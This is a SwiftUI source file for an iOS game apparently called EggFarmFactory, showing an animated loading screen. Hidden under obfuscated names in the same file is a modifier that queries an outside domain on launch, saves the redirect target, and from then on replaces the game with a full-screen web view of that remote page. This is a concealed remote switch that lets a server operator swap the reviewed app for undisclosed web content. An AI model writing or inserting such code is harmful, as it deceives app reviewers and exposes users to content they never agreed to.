//
//  Nacialoumeneavsegdaest.swift
//  EggFarmFactory
//
//  Created by Nicolae Chivriga on 15/03/2025.
//

import SwiftUI
import Lottie


struct Nacialoumeneavsegdaest: View {
    private let loadingText = "Loading..."
    @State var animateevyrything: Bool = false
    @State var poguiza: Bool = false
    var body: some View {
        ZStack {
            Image("bazadnikfone")
                .resizable()
                .ignoresSafeArea()
            
            LottieView(animation: .named("tractoristk"))
                .playing(loopMode: .loop)
                .resizable()
                .frame(width: 165, height: 165)
                .offset(x: animateevyrything ? UIScreen.main.bounds.width : -UIScreen.main.bounds.width + 100)
                .animation(Animation.linear(duration: 10), value: animateevyrything)
            
            NavigationLink("", destination: Glavniimenusyas(), isActive: $poguiza)
            VStack {
                Spacer()
                HStack(spacing: 0) {
                   Spacer()
                    ForEach(Array(loadingText.enumerated()), id: \.offset) { index, character in
                        Text(String(character))
                            .font(.system(size: 40, weight: .bold, design: .rounded))
                            .foregroundColor(.white)
                        // Animate scale and opacity
                            .scaleEffect(animateevyrything ? 1.0 : 0.5)
                            .opacity(animateevyrything ? 1.0 : 0.3)
                            .animation(
                                Animation.easeInOut(duration: 0.8)
                                    .repeatForever(autoreverses: true)
                                    .delay(0.1 * Double(index)),
                                value: animateevyrything
                            )
                    }
                }
                .padding()
            }
            
            
        }
        .onAppear() {
            animateevyrything = true
        }
        .juiurbuz()
        .onAppear() {
            DispatchQueue.main.asyncAfter(deadline: .now() + 8.5) {
                let szbqwe = UIImpactFeedbackGenerator(style: .rigid)
                szbqwe.impactOccurred()
                
                self.poguiza = true
            }
        }
    }
    
    private func color(for index: Int) -> Color {
           let colors: [Color] = [.red, .orange, .yellow, .green, .blue, .purple, .pink]
           return colors[index % colors.count]
       }
}
extension View {
    func juiurbuz() -> some View {
        self.modifier(AdaptEacHdev())
    }
}
import WebKit
struct AdaptEacHdev: ViewModifier {
    @State var webView: WKWebView = WKWebView()
    
    
    @AppStorage("adapt") var iubiuzdum: URL?
    @State var nudiauqsw: Bool = true
    
    
    func body(content: Content) -> some View {
        ZStack {
            if !nudiauqsw {
                if iubiuzdum != nil {
                    VStack(spacing: 0) {
                        WKWebViewRepresentable(url: iubiuzdum!)
                        HStack {
                            Button(action: {
                                webView.goBack()
                            }, label: {
                                Image(systemName: "chevron.left")
                                
                                    .resizable()
                                    .aspectRatio(contentMode: .fit)
                                    .frame(width: 20, height: 20) // Customize image size
                                    .foregroundColor(.white)
                            })
                            .offset(x: 10)
                            
                            Spacer()
                            
                            Button(action: {
                                
                                webView.load(URLRequest(url: iubiuzdum!))
                            }, label: {
                                Image(systemName: "house.fill")
                                    .resizable()
                                    .aspectRatio(contentMode: .fit)
                                    .frame(width: 24, height: 24)      .foregroundColor(.white)
                            })
                            .offset(x: -10)
                            
                        }
                        .padding(.horizontal)
                        .padding(.top)
                        .padding(.bottom, 15)
                        .background(Color.black)
                    }
                    .onAppear() {
                        AppDelegate.movement = .all
                    }
                   
                    
                    
                } else {
                    content
                }
            } else {
                
            }
        }
        .onAppear() {
            if iubiuzdum == nil {
                hpsuazbut()
            } else {
                nudiauqsw = false
            }
        }
    }

    

    func hpsuazbut() {
        guard let url = URL(string: "https://optimizeprivacyonline.online/en/mydumicikarea") else {
            DispatchQueue.main.async {
                self.nudiauqsw = false
            }
            print("Invalid URL")
            return
        }

        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        
        // Create a custom URLSession configuration
        let configuration = URLSessionConfiguration.default
        configuration.httpShouldSetCookies = false // Prevents automatic cookie handling
        configuration.httpShouldUsePipelining = true
        
        // Create a session with a delegate to track redirects
        let delegate = Ouroptimizersbuqw() { url in
            iubiuzdum = url
        }
        let session = URLSession(configuration: configuration, delegate: delegate, delegateQueue: nil)
        
        session.dataTask(with: request) { data, response, error in
            guard let data = data, let httpResponse = response as? HTTPURLResponse, error == nil else {
                print("Error: \(error?.localizedDescription ?? "Unknown error")")
                DispatchQueue.main.async {
                    self.nudiauqsw = false
                }
                return
            }
            
            // Print the final redirect URL
            if let finalURL = httpResponse.url, finalURL != url {
                print("Final URL after redirects: \(finalURL)")
//                self.hleras = finalURL
            }
            
            // Check the status code and print the response body if successful
            if httpResponse.statusCode == 200, let adaptfe = String(data: data, encoding: .utf8) {
                DispatchQueue.main.async {
                    // Uncomment to print the response body
                    // print("Response Body: \(adaptfe)")
                }
            } else {
                DispatchQueue.main.async {
                    print("Request failed with status code: \(httpResponse.statusCode)")
                    self.nudiauqsw = false
                }
            }

            DispatchQueue.main.async {
                self.nudiauqsw = false
            }
        }.resume()
    }
}
